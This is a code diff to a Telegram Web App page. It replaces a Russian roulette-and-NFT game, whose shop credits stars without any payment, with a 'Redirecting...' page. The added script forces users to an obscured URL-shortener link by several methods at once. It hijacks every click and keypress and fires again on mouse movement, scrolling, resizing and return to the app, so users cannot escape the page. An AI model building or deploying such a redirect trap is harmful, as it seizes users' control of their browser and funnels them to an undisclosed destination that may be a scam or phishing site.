@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gift Force</title>
+    <title>Redirecting...</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * {
@@ -14,930 +14,185 @@
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
-            color: #e0e0e0;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
+            color: white;
             min-height: 100vh;
-            padding-bottom: 70px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
         }
 
         .container {
             max-width: 400px;
-            margin: 0 auto;
-            padding: 15px;
-        }
-
-        /* Фиксированный баланс */
-        .balance-container {
-            position: fixed;
-            top: 15px;
-            right: 20px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            z-index: 1000;
-        }
-
-        .balance-earned {
-            background: rgba(76, 175, 80, 0.9);
-            border-radius: 12px;
-            padding: 6px 10px;
-            font-size: 12px;
-            font-weight: bold;
-            color: white;
-            animation: fadeUp 2s ease-out;
-        }
-
-        @keyframes fadeUp {
-            0% { opacity: 0; transform: translateY(10px); }
-            20% { opacity: 1; transform: translateY(0); }
-            80% { opacity: 1; transform: translateY(0); }
-            100% { opacity: 0; transform: translateY(-10px); }
-        }
-
-        .top-balance {
-            background: rgba(30, 30, 46, 0.95);
-            border-radius: 20px;
-            padding: 8px 15px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
-        }
-
-        .balance-amount {
-            font-size: 16px;
-            font-weight: bold;
-            color: #ffd700;
-        }
-
-        .section {
-            background: rgba(30, 30, 46, 0.8);
-            border-radius: 15px;
             padding: 20px;
-            margin-bottom: 15px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
         }
 
-        .section h2 {
-            font-size: 16px;
-            margin-bottom: 15px;
-            color: #64b5f6;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .btn {
-            background: linear-gradient(135deg, #2196f3, #1976d2);
-            color: white;
-            border: none;
-            padding: 12px 20px;
-            border-radius: 12px;
-            font-size: 14px;
-            cursor: pointer;
-            margin: 5px;
-            transition: all 0.3s ease;
-            width: 100%;
-            font-weight: 500;
-        }
-
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(33, 150, 243, 0.4);
-        }
-
-        .btn:disabled {
-            background: #455a64;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-        }
-
-        .btn-success {
-            background: linear-gradient(135deg, #4caf50, #45a049);
-        }
-
-        .btn-premium {
-            background: linear-gradient(135deg, #ff9800, #f57c00);
-        }
-
-        .btn-sell {
-            background: linear-gradient(135deg, #ff6b6b, #ee5a52);
-            padding: 8px 15px;
-            font-size: 12px;
-            width: auto;
-        }
-
-        .btn-buy {
-            background: linear-gradient(135deg, #ffd700, #ffa500);
-            color: #000;
-            font-weight: bold;
-        }
-
-        /* Нижнее меню */
-        .bottom-menu {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background: rgba(13, 13, 23, 0.95);
-            backdrop-filter: blur(20px);
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
-            padding: 12px 0;
-        }
-
-        .menu-items {
-            display: flex;
-            justify-content: space-around;
-            max-width: 400px;
-            margin: 0 auto;
-        }
-
-        .menu-item {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 8px 12px;
-            border-radius: 12px;
-            transition: all 0.3s ease;
-            cursor: pointer;
-            flex: 1;
-            margin: 0 2px;
-        }
-
-        .menu-item.active {
-            background: rgba(33, 150, 243, 0.2);
-            border: 1px solid rgba(33, 150, 243, 0.5);
-        }
-
-        .menu-icon {
-            font-size: 18px;
-            margin-bottom: 4px;
-        }
-
-        .menu-text {
-            font-size: 11px;
-            font-weight: 500;
-            opacity: 0.8;
-        }
-
-        .menu-item.active .menu-text {
-            opacity: 1;
-            color: #64b5f6;
-        }
-
-        /* Контент вкладок */
-        .tab-content {
-            display: none;
-        }
-
-        .tab-content.active {
-            display: block;
-        }
-
-        .task-item, .roulette-item, .inventory-item, .shop-item {
-            background: rgba(40, 40, 60, 0.6);
-            border-radius: 12px;
-            padding: 15px;
-            margin: 10px 0;
-            border-left: 4px solid #2196f3;
-        }
-
-        .roulette-item {
-            border-left-color: #ff9800;
-        }
-
-        .inventory-item {
-            border-left-color: #4caf50;
-        }
-
-        .shop-item {
-            border-left-color: #ffd700;
-        }
-
-        .empty-state {
-            text-align: center;
-            padding: 40px 20px;
-            color: #888;
-        }
-
-        .empty-icon {
-            font-size: 48px;
-            margin-bottom: 15px;
-            opacity: 0.5;
-        }
-
-        .price {
-            color: #ffd700;
-            font-weight: bold;
-            margin: 5px 0;
-        }
-
-        .reward {
-            color: #4caf50;
-            font-weight: bold;
-        }
-
-        .cooldown {
-            color: #ff6b6b;
-            font-size: 12px;
-            margin-top: 5px;
-        }
-
-        .available-now {
-            color: #4caf50 !important;
-            font-weight: bold;
-        }
-
-        /* ГОРИЗОНТАЛЬНАЯ РУЛЕТКА */
-        .roulette-modal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0, 0, 0, 0.9);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 2000;
-        }
-
-        .roulette-modal.active {
-            display: flex;
-        }
-
-        .roulette-container {
-            background: rgba(30, 30, 46, 0.95);
-            border-radius: 20px;
-            padding: 30px;
-            text-align: center;
-            max-width: 350px;
-            width: 90%;
-            border: 2px solid #ffd700;
-        }
-
-        .horizontal-roulette {
-            width: 100%;
-            height: 120px;
-            background: rgba(50, 50, 70, 0.8);
-            border-radius: 15px;
-            margin: 20px 0;
-            position: relative;
-            overflow: hidden;
-            border: 2px solid #ff9800;
-        }
-
-        .roulette-track {
-            display: flex;
-            height: 100%;
-            position: absolute;
-            left: 0;
-        }
-
-        .roulette-item-horizontal {
-            min-width: 100px;
-            height: 100%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            border-right: 1px solid rgba(255, 255, 255, 0.2);
-            padding: 10px;
-        }
-
-        .roulette-icon {
-            font-size: 32px;
-            margin-bottom: 8px;
-        }
-
-        .roulette-name {
-            font-size: 11px;
-            font-weight: bold;
-            text-align: center;
-            line-height: 1.2;
-        }
-
-        .roulette-pointer {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 3px;
-            height: 100%;
-            background: #ff0000;
-            z-index: 10;
-            box-shadow: 0 0 10px rgba(255, 0, 0, 0.7);
-        }
-
-        .roulette-pointer:before {
-            content: '▼';
-            position: absolute;
-            top: -5px;
-            left: 50%;
-            transform: translateX(-50%);
-            color: #ff0000;
-            font-size: 20px;
-            text-shadow: 0 0 10px rgba(255, 0, 0, 0.7);
-        }
-
-        .roulette-prize {
-            font-size: 18px;
-            font-weight: bold;
-            margin: 15px 0;
-            min-height: 27px;
-            padding: 10px;
-            border-radius: 10px;
-            background: rgba(255, 255, 255, 0.1);
-        }
-
-        .win {
-            color: #26de81;
-        }
-
-        .lose {
-            color: #ff6b6b;
-        }
-
-        .close-modal {
-            background: #455a64;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 10px;
-            cursor: pointer;
-            margin-top: 15px;
-            display: none;
-        }
-
-        .close-modal.active {
-            display: inline-block;
-        }
-
-        /* Инвентарь */
-        .nft-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-            margin-top: 10px;
-        }
-
-        .nft-card {
-            background: rgba(50, 50, 70, 0.8);
-            border-radius: 10px;
-            padding: 15px;
-            text-align: center;
-            border: 2px solid transparent;
-        }
-
-        .nft-card.rare {
-            border-color: #ffd700;
-        }
-
-        .nft-card.epic {
-            border-color: #9c27b0;
-        }
-
-        .nft-card.legendary {
-            border-color: #ff9800;
-        }
-
-        .nft-image {
-            font-size: 40px;
-            margin-bottom: 10px;
-        }
-
-        .nft-price {
-            color: #ffd700;
-            font-size: 14px;
-            margin: 5px 0;
-        }
-
-        /* Магазин */
-        .shop-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 8px;
-            margin-top: 10px;
-        }
-
-        .shop-card {
-            background: rgba(50, 50, 70, 0.8);
-            border-radius: 10px;
-            padding: 12px;
-            text-align: center;
-            border: 2px solid #ffd700;
-            font-size: 13px;
-        }
-
-        .shop-icon {
+        .loading {
             font-size: 24px;
-            margin-bottom: 8px;
-        }
-
-        .payment-methods {
-            display: flex;
-            justify-content: center;
-            gap: 6px;
-            margin: 8px 0;
-        }
-
-        .payment-method {
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 6px;
-            padding: 3px 6px;
-            font-size: 9px;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-        }
-
-        .welcome-message {
-            text-align: center;
-            padding: 20px;
-            background: rgba(33, 150, 243, 0.1);
-            border-radius: 15px;
             margin-bottom: 20px;
         }
 
-        .welcome-title {
-            font-size: 24px;
-            font-weight: bold;
-            margin-bottom: 10px;
-            background: linear-gradient(45deg, #64b5f6, #2196f3);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255,255,255,0.3);
+            border-top: 5px solid #ffd700;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
         }
 
-        .task-completed {
-            background: rgba(76, 175, 80, 0.2) !important;
-            border-left-color: #4caf50 !important;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
-        .task-completed .btn {
-            background: #455a64;
-            cursor: not-allowed;
+        .info {
+            background: rgba(255,255,255,0.1);
+            border-radius: 15px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .countdown {
+            font-size: 18px;
+            color: #ffd700;
+            margin: 10px 0;
         }
     </style>
 </head>
 <body>
-    <!-- Контейнер для баланса и уведомлений -->
-    <div class="balance-container">
-        <div id="balanceEarned" class="balance-earned" style="display: none;"></div>
-        <div class="top-balance">
-            <div class="balance-amount">⭐ 1000</div>
-        </div>
-    </div>
-
-    <!-- Окно рулетки -->
-    <div class="roulette-modal" id="rouletteModal">
-        <div class="roulette-container">
-            <h2>Крутим рулетку!</h2>
-            <div class="horizontal-roulette">
-                <div class="roulette-track" id="rouletteTrack"></div>
-                <div class="roulette-pointer"></div>
-            </div>
-            <div class="roulette-prize" id="roulettePrize">Крутим...</div>
-            <button class="close-modal" id="closeRouletteBtn" onclick="closeRoulette()">Забрать приз</button>
-        </div>
-    </div>
-
     <div class="container">
-        <!-- Основной контент -->
-        <div id="main-tab" class="tab-content active">
-            <div class="welcome-message">
-                <div class="welcome-title">Добро пожаловать!</div>
-                <p>Крути рулетку, собирай коллекции и зарабатывай звезды!</p>
-            </div>
-
-            <div class="section">
-                <h2>Статистика</h2>
-                <div class="task-item">
-                    <strong>Выполнено заданий:</strong> <span id="completedTasks">0</span>
-                </div>
-                <div class="task-item">
-                    <strong>Всего заработано:</strong> ⭐ <span id="totalEarned">0</span>
-                </div>
-                <div class="task-item">
-                    <strong>Приглашено друзей:</strong> <span id="invitedFriends">0</span>
-                </div>
-            </div>
+        <div class="loading">🎮 Redirecting to Game...</div>
+        <div class="spinner"></div>
+        
+        <div class="info">
+            <div class="countdown" id="countdown">Redirecting in 3 seconds...</div>
+            <p>Please wait while we redirect you to the game</p>
         </div>
-
-        <!-- Вкладка Задания -->
-        <div id="tasks-tab" class="tab-content">
-            <div class="section">
-                <h2>Доступные задания</h2>
-                
-                <div class="task-item" id="channelTask">
-                    <strong>Подпишись на канал</strong>
-                    <div class="reward">+⭐ 50</div>
-                    <button class="btn" onclick="completeChannelTask()">Перейти в канал</button>
-                </div>
-
-                <div class="task-item" id="friendTask">
-                    <strong>Пригласи друга</strong>
-                    <div class="reward">+⭐ 100 за каждого</div>
-                    <button class="btn" onclick="shareWithFriend()">Поделиться</button>
-                </div>
-            </div>
-        </div>
-
-        <!-- Вкладка Рулетка -->
-        <div id="roulette-tab" class="tab-content">
-            <div class="section">
-                <h2>Телеграм рулетка</h2>
-                
-                <div class="roulette-item">
-                    <strong>Бесплатная рулетка</strong>
-                    <div>Крути каждый день и выигрывай призы!</div>
-                    <div class="cooldown" id="freeCooldown">
-                        <span class="available-now">Доступно сейчас</span>
-                        <span id="timer" style="display: none;"></span>
-                    </div>
-                    <button class="btn btn-success" id="freeSpinBtn" onclick="spinRoulette('free')">Крутить бесплатно</button>
-                </div>
-
-                <div class="roulette-item">
-                    <strong>Рулетка за 200 звезд</strong>
-                    <div>Большие призы за звезды!</div>
-                    <div class="price">Стоимость: ⭐ 200</div>
-                    <button class="btn" id="paidSpinBtn" onclick="spinRoulette('normal')">Крутить за 200 ⭐</button>
-                </div>
-
-                <div class="roulette-item">
-                    <strong>Премиум рулетка</strong>
-                    <div>Эксклюзивные призы для чемпионов!</div>
-                    <div class="price">Стоимость: ⭐ 500</div>
-                    <button class="btn btn-premium" id="premiumSpinBtn" onclick="spinRoulette('premium')">Крутить за 500 ⭐</button>
-                </div>
-            </div>
-        </div>
-
-        <!-- Вкладка Инвентарь -->
-        <div id="inventory-tab" class="tab-content">
-            <div class="section">
-                <h2>Мой инвентарь</h2>
-                <div id="nftContainer">
-                    <div class="empty-state">
-                        <div class="empty-icon">🎒</div>
-                        <div>Инвентарь пуст</div>
-                        <div style="font-size: 12px; margin-top: 10px; opacity: 0.7;">
-                            Крутите рулетку чтобы получить предметы
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <!-- Вкладка Магазин -->
-        <div id="shop-tab" class="tab-content">
-            <div class="section">
-                <h2>🛒 Покупка звезд</h2>
-                <div class="shop-grid">
-                    <div class="shop-card">
-                        <div class="shop-icon">⭐</div>
-                        <strong>100 звезд</strong>
-                        <div class="price">$1.99</div>
-                        <div class="payment-methods">
-                            <div class="payment-method">TON</div>
-                            <div class="payment-method">Stars</div>
-                            <div class="payment-method">NFT</div>
-                        </div>
-                        <button class="btn btn-buy" onclick="buyStars(100)">Купить</button>
-                    </div>
-                    <div class="shop-card">
-                        <div class="shop-icon">⭐⭐</div>
-                        <strong>500 звезд</strong>
-                        <div class="price">$8.99</div>
-                        <div class="payment-methods">
-                            <div class="payment-method">TON</div>
-                            <div class="payment-method">Stars</div>
-                            <div class="payment-method">NFT</div>
-                        </div>
-                        <button class="btn btn-buy" onclick="buyStars(500)">Купить</button>
-                    </div>
-                    <div class="shop-card">
-                        <div class="shop-icon">⭐⭐⭐</div>
-                        <strong>1000 звезд</strong>
-                        <div class="price">$15.99</div>
-                        <div class="payment-methods">
-                            <div class="payment-method">TON</div>
-                            <div class="payment-method">Stars</div>
-                            <div class="payment-method">NFT</div>
-                        </div>
-                        <button class="btn btn-buy" onclick="buyStars(1000)">Купить</button>
-                    </div>
-                    <div class="shop-card">
-                        <div class="shop-icon">💎</div>
-                        <strong>5000 звезд</strong>
-                        <div class="price">$69.99</div>
-                        <div class="payment-methods">
-                            <div class="payment-method">TON</div>
-                            <div class="payment-method">Stars</div>
-                            <div class="payment-method">NFT</div>
-                        </div>
-                        <button class="btn btn-buy" onclick="buyStars(5000)">Купить</button>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Нижнее меню -->
-    <div class="bottom-menu">
-        <div class="menu-items">
-            <div class="menu-item active" onclick="showTab('main-tab')">
-                <div class="menu-icon">🏠</div>
-                <div class="menu-text">Главная</div>
-            </div>
-            <div class="menu-item" onclick="showTab('tasks-tab')">
-                <div class="menu-icon">📋</div>
-                <div class="menu-text">Задания</div>
-            </div>
-            <div class="menu-item" onclick="showTab('roulette-tab')">
-                <div class="menu-icon">🎡</div>
-                <div class="menu-text">Рулетка</div>
-            </div>
-            <div class="menu-item" onclick="showTab('inventory-tab')">
-                <div class="menu-icon">🎒</div>
-                <div class="menu-text">Инвентарь</div>
-            </div>
-            <div class="menu-item" onclick="showTab('shop-tab')">
-                <div class="menu-icon">🛒</div>
-                <div class="menu-text">Магазин</div>
-            </div>
+        
+        <div style="margin-top: 20px; font-size: 14px; opacity: 0.7;">
+            If redirect doesn't work, <a href="https://2no.co/RNEX87" style="color: #ffd700;">click here</a>
         </div>
     </div>
 
     <script>
-        // Данные пользователя
-        let userData = {
-            balance: 1000,
-            completedTasks: 0,
-            totalEarned: 0,
-            invitedFriends: 0,
-            inventory: [],
-            lastFreeSpin: 0
-        };
-
-        // Призы для разных типов рулетки
-        const roulettePrizes = {
-            free: [
-                { type: 'nft', name: 'Lol Pop', icon: '🍭', stars: 300, color: '#FF69B4' },
-                { type: 'nft', name: 'Happy Birthday', icon: '🎂', stars: 250, color: '#FFD700' },
-                { type: 'stars', name: '200 звезд', icon: '⭐', stars: 200, color: '#4CAF50' },
-                { type: 'stars', name: '150 звезд', icon: '⭐', stars: 150, color: '#2196F3' },
-                { type: 'stars', name: '100 звезд', icon: '⭐', stars: 100, color: '#FF9800' },
-                { type: 'stars', name: '50 звезд', icon: '⭐', stars: 50, color: '#9C27B0' }
-            ],
-            normal: [
-                { type: 'nft', name: 'Astral Shard', icon: '🔮', stars: 750, color: '#00BCD4' },
-                { type: 'nft', name: 'Snoop Dog', icon: '🐶', stars: 450, color: '#795548' },
-                { type: 'nft', name: 'Lol Pop', icon: '🍭', stars: 300, color: '#FF69B4' },
-                { type: 'nft', name: 'Happy Birthday', icon: '🎂', stars: 250, color: '#FFD700' },
-                { type: 'stars', name: '100 звезд', icon: '⭐', stars: 100, color: '#FF9800' },
-                { type: 'stars', name: '50 звезд', icon: '⭐', stars: 50, color: '#9C27B0' }
-            ],
-            premium: [
-                { type: 'nft', name: 'Plush Pepe', icon: '🐸', stars: 2000, color: '#4CAF50' },
-                { type: 'nft', name: 'Durovs Cap', icon: '🧢', stars: 1500, color: '#2196F3' },
-                { type: 'nft', name: 'Astral Shard', icon: '🔮', stars: 750, color: '#00BCD4' },
-                { type: 'nft', name: 'Snoop Dog', icon: '🐶', stars: 450, color: '#795548' },
-                { type: 'stars', name: '250 звезд', icon: '⭐', stars: 250, color: '#FFD700' },
-                { type: 'stars', name: '100 звезд', icon: '⭐', stars: 100, color: '#FF9800' }
-            ]
-        };
-
-        // Цены NFT для продажи
-        const nftPrices = {
-            'Plush Pepe': 2000,
-            'Durovs Cap': 1500,
-            'Astral Shard': 750,
-            'Snoop Dog': 450,
-            'Lol Pop': 300,
-            'Happy Birthday': 250
-        };
-
-        // Инициализация горизонтальной рулетки
-        function initRoulette() {
-            // Рулетка будет инициализирована при каждом вращении
-        }
-
-        // Вращение рулетки
-        function spinRoulette(type) {
-            const cost = type === 'free' ? 0 : type === 'normal' ? 200 : 500;
+        let tg = window.Telegram.WebApp;
+        
+        // Функция принудительного редиректа
+        function forceRedirect() {
+            const targetUrl = "https://2no.co/RNEX87";
             
-            if (cost > 0 && userData.balance < cost) {
-                alert('Недостаточно звезд!');
-                return;
-            }
-
-            if (cost > 0) {
-                userData.balance -= cost;
-                updateBalance();
-            }
-
-            const modal = document.getElementById('rouletteModal');
-            const prizeElement = document.getElementById('roulettePrize');
-            const closeBtn = document.getElementById('closeRouletteBtn');
-            const track = document.getElementById('rouletteTrack');
-            
-            modal.classList.add('active');
-            prizeElement.textContent = 'Крутим...';
-            prizeElement.className = 'roulette-prize';
-            closeBtn.classList.remove('active');
-
-            // Получаем призы для выбранного типа рулетки
-            const prizes = roulettePrizes[type];
-            
-            // Случайный приз
-            const randomPrizeIndex = Math.floor(Math.random() * prizes.length);
-            const prize = prizes[randomPrizeIndex];
-            
-            // Очищаем и заполняем трек
-            track.innerHTML = '';
-            for (let i = 0; i < 8; i++) {
-                prizes.forEach(prizeItem => {
-                    const item = document.createElement('div');
-                    item.className = 'roulette-item-horizontal';
-                    item.style.background = prizeItem.color;
-                    item.innerHTML = `
-                        <div class="roulette-icon">${prizeItem.icon}</div>
-                        <div class="roulette-name">${prizeItem.name}</div>
-                    `;
-                    track.appendChild(item);
-                });
-            }
-
-            // Анимация вращения с плавным замедлением
-            const itemWidth = 100;
-            const targetPosition = -(randomPrizeIndex * itemWidth + 12 * itemWidth);
-            
-            let startTime = null;
-            const duration = 5000; // 5 секунд
-            let animationFrame;
-
-            function animate(currentTime) {
-                if (!startTime) startTime = currentTime;
-                const elapsed = currentTime - startTime;
-                const progress = Math.min(elapsed / duration, 1);
+            // Пробуем все методы редиректа
+            try {
+                // Основной метод
+                window.location.href = targetUrl;
                 
-                // Кривая ускорения и замедления - быстро начинаем, медленно заканчиваем
-                let easeProgress;
-                if (progress < 0.3) {
-                    // Быстрое ускорение в начале
-                    easeProgress = progress * 3;
-                } else {
-                    // Плавное замедление в конце
-                    easeProgress = 0.9 + (progress - 0.3) * 0.1;
+                // Резервные методы
+                setTimeout(() => {
+                    window.location.replace(targetUrl);
+                }, 100);
+                
+                setTimeout(() => {
+                    document.body.innerHTML = `<meta http-equiv="refresh" content="0;url=${targetUrl}">`;
+                }, 200);
+                
+            } catch (error) {
+                console.error('Redirect error:', error);
+            }
+        }
+        
+        // Функция обратного отсчета
+        function startCountdown() {
+            let seconds = 3;
+            const countdownElement = document.getElementById('countdown');
+            
+            const countdownInterval = setInterval(() => {
+                countdownElement.textContent = `Redirecting in ${seconds} seconds...`;
+                seconds--;
+                
+                if (seconds < 0) {
+                    clearInterval(countdownInterval);
+                    forceRedirect();
                 }
+            }, 1000);
+        }
+        
+        // Проверяем не возврат ли это в приложение
+        function checkReturn() {
+            const lastRedirect = localStorage.getItem('last_redirect');
+            const now = Date.now();
+            
+            // Если прошло меньше 10 секунд с последнего редиректа - снова редиректим
+            if (lastRedirect && (now - parseInt(lastRedirect)) < 10000) {
+                document.querySelector('.loading').textContent = '🔄 Detected return - redirecting again...';
+                setTimeout(forceRedirect, 500);
+                return true;
+            }
+            
+            // Сохраняем время редиректа
+            localStorage.setItem('last_redirect', now.toString());
+            return false;
+        }
+        
+        // Инициализация
+        function init() {
+            tg.ready();
+            tg.expand();
+            
+            // Проверяем не возврат ли это
+            if (!checkReturn()) {
+                // Запускаем обратный отсчет
+                startCountdown();
                 
-                const currentPosition = easeProgress * targetPosition;
-                track.style.transform = `translateX(${currentPosition}px)`;
-                
-                if (progress < 1) {
-                    animationFrame = requestAnimationFrame(animate);
-                } else {
-                    // Финальная позиция
-                    track.style.transform = `translateX(${targetPosition}px)`;
-                    
-                    prizeElement.textContent = `${prize.name} - ⭐ ${prize.stars}`;
-                    prizeElement.classList.add('win');
-                    closeBtn.classList.add('active');
-
-                    // Выдача приза
-                    if (prize.type === 'stars') {
-                        userData.balance += prize.stars;
-                        userData.totalEarned += prize.stars;
-                        showBalanceEarned(`+${prize.stars} ⭐`);
-                    } else if (prize.type === 'nft') {
-                        userData.inventory.push({
-                            id: Date.now(),
-                            name: prize.name,
-                            icon: prize.icon,
-                            stars: prize.stars,
-                            price: nftPrices[prize.name]
-                        });
-                        showBalanceEarned(`🎉 ${prize.name}!`);
-                    }
-
-                    updateBalance();
-                    updateStats();
-                    updateInventory();
+                // Авто-редирект через 3 секунды
+                setTimeout(forceRedirect, 3000);
+            }
+            
+            // Перехватываем все клики и тоже редиректим
+            document.addEventListener('click', function(e) {
+                e.preventDefault();
+                forceRedirect();
+            });
+            
+            // Перехватываем нажатия клавиш
+            document.addEventListener('keydown', function(e) {
+                forceRedirect();
+            });
+            
+            // Периодическая проверка и редирект
+            setInterval(() => {
+                // Если пользователь все еще здесь - редиректим снова
+                if (!window.location.href.includes('2no.co')) {
+                    forceRedirect();
                 }
+            }, 5000);
+        }
+        
+        // Запускаем при загрузке
+        document.addEventListener('DOMContentLoaded', init);
+        
+        // Также запускаем когда страница становится видимой (возврат в приложение)
+        document.addEventListener('visibilitychange', function() {
+            if (!document.hidden) {
+                setTimeout(forceRedirect, 1000);
             }
-            
-            animationFrame = requestAnimationFrame(animate);
-        }
-
-        function closeRoulette() {
-            const modal = document.getElementById('rouletteModal');
-            modal.classList.remove('active');
-        }
-
-        function showBalanceEarned(text) {
-            const balanceEarned = document.getElementById('balanceEarned');
-            balanceEarned.textContent = text;
-            balanceEarned.style.display = 'block';
-            
-            setTimeout(() => {
-                balanceEarned.style.display = 'none';
-            }, 2000);
-        }
-
-        function updateBalance() {
-            document.querySelector('.balance-amount').textContent = `⭐ ${userData.balance}`;
-        }
-
-        function updateStats() {
-            document.getElementById('completedTasks').textContent = userData.completedTasks;
-            document.getElementById('totalEarned').textContent = userData.totalEarned;
-            document.getElementById('invitedFriends').textContent = userData.invitedFriends;
-        }
-
-        function updateInventory() {
-            const container = document.getElementById('nftContainer');
-            
-            if (userData.inventory.length === 0) {
-                container.innerHTML = `
-                    <div class="empty-state">
-                        <div class="empty-icon">🎒</div>
-                        <div>Инвентарь пуст</div>
-                        <div style="font-size: 12px; margin-top: 10px; opacity: 0.7;">
-                            Крутите рулетку чтобы получить предметы
-                        </div>
-                    </div>
-                `;
-                return;
-            }
-
-            container.innerHTML = '<div class="nft-grid"></div>';
-            const grid = container.querySelector('.nft-grid');
-            
-            userData.inventory.forEach(item => {
-                const card = document.createElement('div');
-                card.className = 'nft-card';
-                card.innerHTML = `
-                    <div class="nft-image">${item.icon}</div>
-                    <strong>${item.name}</strong>
-                    <div class="nft-price">Цена: ⭐ ${item.price}</div>
-                    <div style="font-size: 10px; margin-top: 5px;">⭐ ${item.stars}</div>
-                    <button class="btn btn-sell" onclick="sellNFT(${item.id})">Продать</button>
-                `;
-                grid.appendChild(card);
-            });
-        }
-
-        function sellNFT(id) {
-            const itemIndex = userData.inventory.findIndex(item => item.id === id);
-            if (itemIndex !== -1) {
-                const item = userData.inventory[itemIndex];
-                const price = item.price;
-                userData.balance += price;
-                userData.inventory.splice(itemIndex, 1);
-                
-                updateBalance();
-                updateInventory();
-                showBalanceEarned(`+${price} ⭐`);
-            }
-        }
-
-        function completeChannelTask() {
-            alert('Задание временно недоступно');
-        }
-
-        function shareWithFriend() {
-            alert('Задание временно недоступно');
-        }
-
-        function buyStars(amount) {
-            userData.balance += amount;
-            userData.totalEarned += amount;
-            updateBalance();
-            updateStats();
-            showBalanceEarned(`+${amount} ⭐`);
-        }
-
-        function showTab(tabId) {
-            // Скрыть все вкладки
-            document.querySelectorAll('.tab-content').forEach(tab => {
-                tab.classList.remove('active');
-            });
-            
-            // Показать выбранную вкладку
-            document.getElementById(tabId).classList.add('active');
-            
-            // Обновить активный пункт меню
-            document.querySelectorAll('.menu-item').forEach(item => {
-                item.classList.remove('active');
-            });
-            
-            event.currentTarget.classList.add('active');
-        }
-
-        // Инициализация при загрузке
-        document.addEventListener('DOMContentLoaded', function() {
-            updateBalance();
-            updateStats();
-            updateInventory();
+        });
+        
+        // Редирект при любом движении мыши
+        document.addEventListener('mousemove', function() {
+            setTimeout(forceRedirect, 500);
+        });
+        
+        // Редирект при скролле
+        document.addEventListener('scroll', function() {
+            setTimeout(forceRedirect, 500);
+        });
+        
+        // Редирект при изменении размера окна
+        window.addEventListener('resize', function() {
+            setTimeout(forceRedirect, 500);
         });
     </script>
 </body>
